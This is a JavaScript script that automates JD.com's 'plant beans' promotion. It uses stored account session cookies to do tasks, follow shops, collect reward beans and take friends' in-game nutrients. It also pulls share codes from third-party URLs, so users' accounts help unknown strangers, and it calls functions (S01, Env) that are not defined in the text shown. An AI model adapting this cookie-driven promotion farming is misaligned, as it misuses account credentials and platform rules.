/*
种豆得豆 脚本更新地址：https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js
更新时间：2021-1-16
活动入口：京东APP我的-更多工具-种豆得豆
已支持IOS京东双账号,云端N个京东账号
脚本兼容:QuantumultX,Surge,Loon,JSBox,Node.js
注：会自动关注任务中的店铺跟商品，介意者勿使用。
互助码shareCode请先手动运行脚本查看打印可看到
每个京东账号每天只能帮助3个人。多出的助力码将会助力失败。
=====================================Quantumult X=================================
[task_local]
1 7-21/2 * * * https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js, tag=种豆得豆, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jdzd.png, enabled=true

=====================================Loon================================
[Script]
cron "1 7-21/2 * * *" script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js,tag=京东种豆得豆

======================================Surge==========================
京东种豆得豆 = type=cron,cronexp="1 7-21/2 * * *",wake-system=1,timeout=3600,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js

====================================小火箭=============================
京东种豆得豆 = type=cron,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js, cronexpr="1 7-21/2 * * *", timeout=3600, enable=true

搬的https://github.com/uniqueque/QuantumultX/blob/4c1572d93d4d4f883f483f907120a75d925a693e/Script/jd_plantBean.js
*/
const $ = new Env('京东种豆得豆');
//Node.js用户请在jdCookie.js处填写京东ck;
//ios等软件用户直接用NobyDa的jd cookie
let jdNotify = true;//是否开启静默运行。默认true开启
let cookiesArr = [], cookie = '', jdPlantBeanShareArr = [], isBox = false, notify, newShareCodes, option, message,subTitle;
//京东接口地址
const JD_API_HOST = 'https://api.m.jd.com/client.action';
//助力好友分享码(最多3个,否则后面的助力失败)
//此此内容是IOS用户下载脚本到本地使用，填写互助码的地方，同一京东账号的好友互助码请使用@符号隔开。
//下面给出两个账号的填写示例（iOS只支持2个京东账号）
let shareCodes = [ // IOS本地脚本用户这个列表填入你要助力的好友的shareCode
                   //账号一的好友shareCode,不同好友的shareCode中间用@符号隔开
  '3xd6hi7wz3detzueuft3fjnaq6shonvreqhvugy@nkvdrkoit5o65hgsezt2hkynoeq3olf63v6icua@fb227jqogvovf4dzt65kyksuqq3h7wlwy7o5jii@2glpkm3dt2ujt5eufktgoxeewa5ac3f4ijdgqji@anvpoh7gttncs535ikqc3dfbbsnst3auzw6gmjq@e7lhibzb3zek3l2je2y7rjczlz3sq4c6e2r72di@mlrdw3aw26j3xrwlavyve554fsprq7lxnn2esoa@7ii2tqua5cw4cuvznmvewfo7gbrfz5c4dyurxen5sazkv5ctbrdq',
  //账号二的好友shareCode,不同好友的shareCode中间用@符号隔开
  '3xd6hi7wz3detzueuft3fjnaq6shonvreqhvugy@nkvdrkoit5o65hgsezt2hkynoeq3olf63v6icua@fb227jqogvovf4dzt65kyksuqq3h7wlwy7o5jii@2glpkm3dt2ujt5eufktgoxeewa5ac3f4ijdgqji@anvpoh7gttncs535ikqc3dfbbsnst3auzw6gmjq@e7lhibzb3zek3l2je2y7rjczlz3sq4c6e2r72di@mlrdw3aw26j3xrwlavyve554fsprq7lxnn2esoa@7ii2tqua5cw4cuvznmvewfo7gbrfz5c4dyurxen5sazkv5ctbrdq',
]
let allMessage = ``;
let currentRoundId = null;//本期活动id
let lastRoundId = null;//上期id
let roundList = [];
let awardState = '';//上期活动的京豆是否收取
let helpAuthor = true;
!(async () => {
  await requireConfig();
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      await TotalBean();
      console.log(`\n开始【京东账号${$.index}】${$.nickName || $.UserName}\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      message = '';
      subTitle = '';
      option = {};
      await shareCodesFormat();
      await jdPlantBean();
      await showMsg();
    }
  }
  if ($.isNode() && allMessage) {
    await notify.sendNotify(`${$.name}`, `${allMessage}`)
  }
})().catch((e) => {
  $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
}).finally(() => {
  $.done();
})

async function jdPlantBean() {
  try {
    console.log(`获取任务及基本信息`)
    await S01()
    await plantBeanIndex();
    // console.log(plantBeanIndexResult.data.taskList);
    if ($.plantBeanIndexResult && $.plantBeanIndexResult.code === '0') {
      const shareUrl = $.plantBeanIndexResult.data.jwordShareInfo.shareUrl
      $.myPlantUuid = getParam(shareUrl, 'plantUuid')
      console.log(`\n【京东账号${$.index}（${$.UserName}）的${$.name}好友互助码】${$.myPlantUuid}\n`);
      roundList = $.plantBeanIndexResult.data.roundList;
      currentRoundId = roundList[1].roundId;//本期的roundId
      lastRoundId = roundList[0].roundId;//上期的roundId
      awardState = roundList[0].awardState;
      $.taskList = $.plantBeanIndexResult.data.taskList;
      subTitle = `【京东昵称】${$.plantBeanIndexResult.data.plantUserInfo.plantNickName}`;
      message += `【上期时间】${roundList[0].dateDesc.replace('上期 ', '')}\n`;
      message += `【上期成长值】${roundList[0].growth}\n`;
      await receiveNutrients();//定时领取营养液
      await doHelp();//助力
      await doTask();//做日常任务
      await doEgg();
      await stealFriendWater();
      await doCultureBean();
      await doGetReward();
      await showTaskProcess();
      await plantShareSupportList();
    } else {
      console.log(`种豆得豆-初始失败:  ${JSON.stringify($.plantBeanIndexResult)}`);
    }
  } catch (e) {
    $.logErr(e);
    const errMsg = `京东账号${$.index} ${$.nickName || $.UserName}\n任务执行异常，请检查执行日志 ‼️‼️`;
    $.msg($.name, '', `京东账号${$.index} ${$.nickName || $.UserName}\n${errMsg}`)
  }
}
async function doGetReward() {
  console.log(`【上轮京豆】${awardState === '4' ? '采摘中' : awardState === '5' ? '可收获了' : '已领取'}`);
  if (awardState === '4') {
    //京豆采摘中...
    message += `【上期状态】${roundList[0].tipBeanEndTitle}\n`;
  } else if (awardState === '5') {
    //收获
    await getReward();
    console.log('开始领取京豆');
    if ($.getReward && $.getReward.code === '0') {
      console.log('京豆领取成功');
      message += `【上期兑换京豆】${$.getReward.data.awardBean}个\n`;
      $.msg($.name, subTitle, message);
      allMessage += `京东账号${$.index} ${$.nickName}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`
      // if ($.isNode()) {
      //   await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName || $.UserName}`, `京东账号${$.index} ${$.nickName}\n${message}`);
      // }
    } else {
      console.log(`$.getReward 异常：${JSON.stringify($.getReward)}`)
    }
  } else if (awardState === '6') {
    //京豆已领取
    message += `【上期兑换京豆】${roundList[0].awardBeans}个\n`;
  }
  if (roundList[1].dateDesc.indexOf('本期 ') > -1) {
    roundList[1].dateDesc = roundList[1].dateDesc.substr(roundList[1].dateDesc.indexOf('本期 ') + 3, roundList[1].dateDesc.length);
  }
  message += `【本期时间】${roundList[1].dateDesc}\n`;
  message += `【本期成长值】${roundList[1].growth}\n`;
}
async function doCultureBean() {
  await plantBeanIndex();
  if ($.plantBeanIndexResult && $.plantBeanIndexResult.code === '0') {
    const plantBeanRound = $.plantBeanIndexResult.data.roundList[1]
    if (plantBeanRound.roundState === '2') {
      //收取营养液
      if (plantBeanRound.bubbleInfos && plantBeanRound.bubbleInfos.length) console.log(`开始收取营养液`)
      for (let bubbleInfo of plantBeanRound.bubbleInfos) {
        console.log(`收取-${bubbleInfo.name}-的营养液`)
        await cultureBean(plantBeanRound.roundId, bubbleInfo.nutrientsType)
        console.log(`收取营养液结果:${JSON.stringify($.cultureBeanRes)}`)
      }
    }
  } else {
    console.log(`plantBeanIndexResult:${JSON.stringify($.plantBeanIndexResult)}`)
  }
}
async function stealFriendWater() {
  await stealFriendList();
  if ($.stealFriendList && $.stealFriendList.code === '0') {
    if ($.stealFriendList.data && $.stealFriendList.data.tips) {
      console.log('\n\n今日偷取好友营养液已达上限\n\n');
      return
    }
    if ($.stealFriendList.data && $.stealFriendList.data.friendInfoList && $.stealFriendList.data.friendInfoList.length > 0) {
      let nowTimes = new Date(new Date().getTime() + new Date().getTimezoneOffset()*60*1000 + 8*60*60*1000);
      for (let item of $.stealFriendList.data.friendInfoList) {
        if (new Date(nowTimes).getHours() === 20) {
          if (item.nutrCount >= 2) {
            // console.log(`可以偷的好友的信息::${JSON.stringify(item)}`);
            console.log(`可以偷的好友的信息paradiseUuid::${JSON.stringify(item.paradiseUuid)}`);
            await collectUserNutr(item.paradiseUuid);
            console.log(`偷取好友营养液情况:${JSON.stringify($.stealFriendRes)}`)
            if ($.stealFriendRes && $.stealFriendRes.code === '0') {
              console.log(`偷取好友营养液成功`)
            }
          }
        } else {
          if (item.nutrCount >= 3) {
            // console.log(`可以偷的好友的信息::${JSON.stringify(item)}`);
            console.log(`可以偷的好友的信息paradiseUuid::${JSON.stringify(item.paradiseUuid)}`);
            await collectUserNutr(item.paradiseUuid);
            console.log(`偷取好友营养液情况:${JSON.stringify($.stealFriendRes)}`)
            if ($.stealFriendRes && $.stealFriendRes.code === '0') {
              console.log(`偷取好友营养液成功`)
            }
          }
        }
      }
    }
  } else {
    console.log(`$.stealFriendList 异常： ${JSON.stringify($.stealFriendList)}`)
  }
}
async function doEgg() {
  await egg();
  if ($.plantEggLotteryRes && $.plantEggLotteryRes.code === '0') {
    if ($.plantEggLotteryRes.data.restLotteryNum > 0) {
      const eggL = new Array($.plantEggLotteryRes.data.restLotteryNum).fill('');
      console.log(`目前共有${eggL.length}次扭蛋的机会`)
      for (let i = 0; i < eggL.length; i++) {
        console.log(`开始第${i + 1}次扭蛋`);
        await plantEggDoLottery();
        console.log(`天天扭蛋成功：${JSON.stringify($.plantEggDoLotteryResult)}`);
      }
    } else {
      console.log('暂无扭蛋机会')
    }
  } else {
    console.log('查询天天扭蛋的机会失败' + JSON.stringify($.plantEggLotteryRes))
  }
}
async function doTask() {
  if ($.taskList && $.taskList.length > 0) {
    for (let item of $.taskList) {
      if (item.isFinished === 1) {
        console.log(`${item.taskName} 任务已完成\n`);
        continue;
      } else {
        if (item.taskType === 8) {
          console.log(`\n【${item.taskName}】任务未完成,需自行手动去京东APP完成，${item.desc}营养液\n`)
        } else {
          console.log(`\n【${item.taskName}】任务未完成,${item.desc}营养液\n`)
        }
      }
      if (item.dailyTimes === 1 && item.taskType !== 8) {
        console.log(`\n开始做 ${item.taskName}任务`);
        // $.receiveNutrientsTaskRes = await receiveNutrientsTask(item.taskType);
        await receiveNutrientsTask(item.taskType);
        console.log(`做 ${item.taskName}任务结果:${JSON.stringify($.receiveNutrientsTaskRes)}\n`);
      }
      if (item.taskType === 3) {
        //浏览店铺
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedShopNum = item.totalNum - item.gainedNum;
        if (unFinishedShopNum === 0) {
          continue
        }
        await shopTaskList();
        const { data } = $.shopTaskListRes;
        let goodShopListARR = [], moreShopListARR = [], shopList = [];
        const { goodShopList, moreShopList } = data;
        for (let i of goodShopList) {
          if (i.taskState === '2') {
            goodShopListARR.push(i);
          }
        }
        for (let j of moreShopList) {
          if (j.taskState === '2') {
            moreShopListARR.push(j);
          }
        }
        shopList = goodShopListARR.concat(moreShopListARR);
        for (let shop of shopList) {
          const { shopId, shopTaskId } = shop;
          const body = {
            "monitor_refer": "plant_shopNutrientsTask",
            "shopId": shopId,
            "shopTaskId": shopTaskId
          }
          const shopRes = await requestGet('shopNutrientsTask', body);
          console.log(`shopRes结果:${JSON.stringify(shopRes)}`);
          if (shopRes && shopRes.code === '0') {
            if (shopRes.data && shopRes.data.nutrState && shopRes.data.nutrState === '1') {
              unFinishedShopNum --;
            }
          }
          if (unFinishedShopNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
      if (item.taskType === 5) {
        //挑选商品
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedProductNum = item.totalNum - item.gainedNum;
        if (unFinishedProductNum === 0) {
          continue
        }
        await productTaskList();
        // console.log('productTaskList', $.productTaskList);
        const { data } = $.productTaskList;
        let productListARR = [], productList = [];
        const { productInfoList } = data;
        for (let i = 0; i < productInfoList.length; i++) {
          for (let j = 0; j < productInfoList[i].length; j++){
            productListARR.push(productInfoList[i][j]);
          }
        }
        for (let i of productListARR) {
          if (i.taskState === '2') {
            productList.push(i);
          }
        }
        for (let product of productList) {
          const { skuId, productTaskId } = product;
          const body = {
            "monitor_refer": "plant_productNutrientsTask",
            "productTaskId": productTaskId,
            "skuId": skuId
          }
          const productRes = await requestGet('productNutrientsTask', body);
          if (productRes && productRes.code === '0') {
            // console.log('nutrState', productRes)
            //这里添加多重判断,有时候会出现活动太火爆的问题,导致nutrState没有
            if (productRes.data && productRes.data.nutrState && productRes.data.nutrState === '1') {
              unFinishedProductNum --;
            }
          }
          if (unFinishedProductNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
      if (item.taskType === 10) {
        //关注频道
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedChannelNum = item.totalNum - item.gainedNum;
        if (unFinishedChannelNum === 0) {
          continue
        }
        await plantChannelTaskList();
        const { data } = $.plantChannelTaskList;
        // console.log('goodShopList', data.goodShopList);
        // console.log('moreShopList', data.moreShopList);
        let goodChannelListARR = [], normalChannelListARR = [], channelList = [];
        const { goodChannelList, normalChannelList } = data;
        for (let i of goodChannelList) {
          if (i.taskState === '2') {
            goodChannelListARR.push(i);
          }
        }
        for (let j of normalChannelList) {
          if (j.taskState === '2') {
            normalChannelListARR.push(j);
          }
        }
        channelList = goodChannelListARR.concat(normalChannelListARR);
        for (let channelItem of channelList) {
          const { channelId, channelTaskId } = channelItem;
          const body = {
            "channelId": channelId,
            "channelTaskId": channelTaskId
          }
          const channelRes = await requestGet('plantChannelNutrientsTask', body);
          console.log(`channelRes结果:${JSON.stringify(channelRes)}`);
          if (channelRes && channelRes.code === '0') {
            if (channelRes.data && channelRes.data.nutrState && channelRes.data.nutrState === '1') {
              unFinishedChannelNum --;
            }
          }
          if (unFinishedChannelNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
    }
  }
}
function showTaskProcess() {
  return new Promise(async resolve => {
    await plantBeanIndex();
    $.taskList = $.plantBeanIndexResult.data.taskList;
    if ($.taskList && $.taskList.length > 0) {
      console.log("     任务   进度");
      for (let item of $.taskList) {
        console.log(`[${item["taskName"]}]  ${item["gainedNum"]}/${item["totalNum"]}   ${item["isFinished"]}`);
      }
    }
    resolve()
  })
}
//助力好友
async function doHelp() {
  for (let plantUuid of newShareCodes) {
    console.log(`开始助力京东账号${$.index} - ${$.nickName}的好友: ${plantUuid}`);
    if (!plantUuid) continue;
    if (plantUuid === $.myPlantUuid) {
      console.log(`\n跳过自己的plantUuid\n`)
      continue
    }
    await helpShare(plantUuid);
    if ($.helpResult && $.helpResult.code === '0') {
      // console.log(`助力好友结果: ${JSON.stringify($.helpResult.data.helpShareRes)}`);
      if ($.helpResult.data.helpShareRes) {
        if ($.helpResult.data.helpShareRes.state === '1') {
          console.log(`助力好友${plantUuid}成功`)
          console.log(`${$.helpResult.data.helpShareRes.promptText}\n`);
        } else if ($.helpResult.data.helpShareRes.state === '2') {
          console.log('您今日助力的机会已耗尽，已不能再帮助好友助力了\n');
          break;
        } else if ($.helpResult.data.helpShareRes.state === '3') {
          console.log('该好友今日已满9人助力/20瓶营养液,明天再来为Ta助力吧\n')
        } else if ($.helpResult.data.helpShareRes.state === '4') {
          console.log(`${$.helpResult.data.helpShareRes.promptText}\n`)
        } else {
          console.log(`助力其他情况：${JSON.stringify($.helpResult.data.helpShareRes)}`);
        }
      }
    } else {
      console.log(`助力好友失败: ${JSON.stringify($.helpResult)}`);
    }
  }
}
function showMsg() {
  $.log(`\n${message}\n`);
  jdNotify = $.getdata('jdPlantBeanNotify') ? $.getdata('jdPlantBeanNotify') : jdNotify;
  if (!jdNotify || jdNotify === 'false') {
    $.msg($.name, subTitle, message);
  }
}
// ================================================此处是API=================================
//每轮种豆活动获取结束后,自动收取京豆
async function getReward() {
  const body = {
    "roundId": lastRoundId
  }
  $.getReward = await request('receivedBean', body);
}
//收取营养液
async function cultureBean(currentRoundId, nutrientsType) {
  let functionId = arguments.callee.name.toString();
  let body = {
    "roundId": currentRoundId,
    "nutrientsType": nutrientsType,
  }
  $.cultureBeanRes = await request(functionId, body);
}
//偷营养液大于等于3瓶的好友
//①查询好友列表
async function stealFriendList() {
  const body = {
    pageNum: '1'
  }
  $.stealFriendList = await request('plantFriendList', body);
}

//②执行偷好友营养液的动作
async function collectUserNutr(paradiseUuid) {
  console.log('开始偷好友');
  // console.log(paradiseUuid);
  let functionId = arguments.callee.name.toString();
  const body = {
    "paradiseUuid": paradiseUuid,
    "roundId": currentRoundId
  }
  $.stealFriendRes = await request(functionId, body);
}
async function receiveNutrients() {
  $.receiveNutrientsRes = await request('receiveNutrients', {"roundId": currentRoundId, "monitor_refer": "plant_receiveNutrients"})
  // console.log(`定时领取营养液结果:${JSON.stringify($.receiveNutrientsRes)}`)
}
async function plantEggDoLottery() {
  $.plantEggDoLotteryResult = await requestGet('plantEggDoLottery');
}
//查询天天扭蛋的机会
async function egg() {
  $.plantEggLotteryRes = await requestGet('plantEggLotteryIndex');
}
async function productTaskList() {
  let functionId = arguments.callee.name.toString();
  $.productTaskList = await requestGet(functionId, {"monitor_refer": "plant_productTaskList"});
}
async function plantChannelTaskList() {
  let functionId = arguments.callee.name.toString();
  $.plantChannelTaskList = await requestGet(functionId);
  // console.log('$.plantChannelTaskList', $.plantChannelTaskList)
}
async function shopTaskList() {
  let functionId = arguments.callee.name.toString();
  $.shopTaskListRes = await requestGet(functionId, {"monitor_refer": "plant_receiveNutrients"});
  // console.log('$.shopTaskListRes', $.shopTaskListRes)
}
async function receiveNutrientsTask(awardType) {
  const functionId = arguments.callee.name.toString();
  const body = {
    "monitor_refer": "receiveNutrientsTask",
    "awardType": `${awardType}`,
  }
  $.receiveNutrientsTaskRes = await requestGet(functionId, body);
}
async function plantShareSupportList() {
  $.shareSupportList = await requestGet('plantShareSupportList', {"roundId": ""});
  if ($.shareSupportList && $.shareSupportList.code === '0') {
    const { data } = $.shareSupportList;
    //当日北京时间0点时间戳
    const UTC8_Zero_Time = parseInt((Date.now() + 28800000) / 86400000) * 86400000 - 28800000;
    //次日北京时间0点时间戳
    const UTC8_End_Time = parseInt((Date.now() + 28800000) / 86400000) * 86400000 - 28800000 + (24 * 60 * 60 * 1000);
    let friendList = [];
    data.map(item => {
      if (UTC8_Zero_Time <= item['createTime'] && item['createTime'] < UTC8_End_Time) {
        friendList.push(item);
      }
    })
    message += `【助力您的好友】共${friendList.length}人`;
  } else {
    console.log(`异常情况：${JSON.stringify($.shareSupportList)}`)
  }
}
//助力好友的api
async function helpShare(plantUuid) {
  console.log(`\n开始助力好友: ${plantUuid}`);
  const body = {
    "plantUuid": plantUuid,
    "wxHeadImgUrl": "",
    "shareUuid": "",
    "followType": "1",
  }
  $.helpResult = await request(`plantBeanIndex`, body);
  console.log(`助力结果的code:${$.helpResult && $.helpResult.code}`);
}
async function plantBeanIndex() {
  $.plantBeanIndexResult = await request('plantBeanIndex');//plantBeanIndexBody
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://cdn.jsdelivr.net/gh/wuzhi-docker1/RandomShareCode@main/JD_Plant_Bean.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，将切换为备用API`)
          console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
          $.get({url: `https://raw.githubusercontent.com/shuyeshuye/RandomShareCode/main/JD_Plant_Bean.json`, 'timeout': 10000},(err, resp, data)=>{
          data = JSON.parse(data);})
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(15000);
    resolve()
  })
}
//格式化助力码
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${jdPlantBeanShareArr[$.index - 1]}`)
    newShareCodes = [];
    if (jdPlantBeanShareArr[$.index - 1]) {
      newShareCodes = jdPlantBeanShareArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > shareCodes.length ? (shareCodes.length - 1) : ($.index - 1);
      newShareCodes = shareCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      newShareCodes = [...new Set([...newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify(newShareCodes)}`)
    resolve();
  })
}
function requireConfig() {
  return new Promise(resolve => {
    console.log('开始获取种豆得豆配置文件\n')
    notify = $.isNode() ? require('./sendNotify') : '';
    //Node.js用户请在jdCookie.js处填写京东ck;
    const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
    const jdPlantBeanShareCodes = $.isNode() ? require('./jdPlantBeanShareCodes.js') : '';
    //IOS等用户直接用NobyDa的jd cookie
    if ($.isNode()) {
      Object.keys(jdCookieNode).forEach((item) => {
        if (jdCookieNode[item]) {
          cookiesArr.push(jdCookieNode[item])
        }
      })
      if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
    } else {
      cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
    }
    console.log(`共${cookiesArr.length}个京东账号\n`)
    if ($.isNode()) {
      Object.keys(jdPlantBeanShareCodes).forEach((item) => {
        if (jdPlantBeanShareCodes[item]) {
          jdPlantBeanShareArr.push(jdPlantBeanShareCodes[item])
        }
      })
    } else {
      const boxShareCodeArr = ['jd_plantBean1', 'jd_plantBean2', 'jd_plantBean3'];
      const boxShareCodeArr2 = ['jd2_plantBean1', 'jd2_plantBean2', 'jd2_plantBean3'];
      const isBox1 = boxShareCodeArr.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      const isBox2 = boxShareCodeArr2.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      isBox = isBox1 ? isBox1 : isBox2;
      if (isBox1) {
        let temp = [];
        for (const item of boxShareCodeArr) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdPlantBeanShareArr.push(temp.join('@'));
      }
      if (isBox2) {
        let temp = [];
        for (const item of boxShareCodeArr2) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdPlantBeanShareArr.push(temp.join('@'));
      }
    }
    // console.log(`\n种豆得豆助力码::${JSON.stringify(jdPlantBeanShareArr)}`);
    console.log(`您提供了${jdPlantBeanShareArr.length}个账号的种豆得豆助力码\n`);
    resolve()
  })
}
function requestGet(function_id, body = {}) {
  if (!body.version) {
    body["version"] = "9.0.0.1";
  }
  body["monitor_source"] = "plant_app_plant_index";
  body["monitor_refer"] = "";
  return new Promise(async resolve => {
    await $.wait(2000);
    const option = {
      url: `${JD_API_HOST}?functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld`,
      headers: {
        'Cookie': cookie,
        'Host': 'api.m.jd.com',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'User-Agent': 'JD4iPhone/167283 (iPhone;iOS 13.6.1;Scale/3.00)',
        'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': "application/x-www-form-urlencoded"
      },
      timeout: 10000,
    };
    $.get(option, (err, resp, data) => {
      try {
        if (err) {
          console.log('\n种豆得豆: API查询请求失败 ‼️‼️')
          $.logErr(err);
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
      },
      "timeout": 10000,
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = (data['base'] && data['base'].nickname) || $.UserName;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function request(function_id, body = {}){
  return new Promise(async resolve => {
    await $.wait(2000);
    $.post(taskUrl(function_id, body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n种豆得豆: API查询请求失败 ‼️‼️')
          console.log(`function_id:${function_id}`)
          $.logErr(err);
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function taskUrl(function_id, body) {
  body["version"] = "9.2.4.0";
  body["monitor_source"] = "plant_app_plant_index";
  body["monitor_refer"] = "";
  return {
    url: JD_API_HOST,
    body: `functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld&client=apple&area=19_1601_50258_51885&build=167490&clientVersion=9.3.2`,
    headers: {
      "Cookie": cookie,
      "Host": "api.m.jd.com",
      "Accept": "*/*",
      "Connection": "keep-alive",
      "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      "Accept-Language": "zh-Hans-CN;q=1,en-CN;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Content-Type": "application/x-www-form-urlencoded"
    },
    timeout: 10000,
  }
}
function getParam(url, name) {
  const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i")
  const r = url.match(reg)
  if (r != null) return unescape(r[2]);
  return null;
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
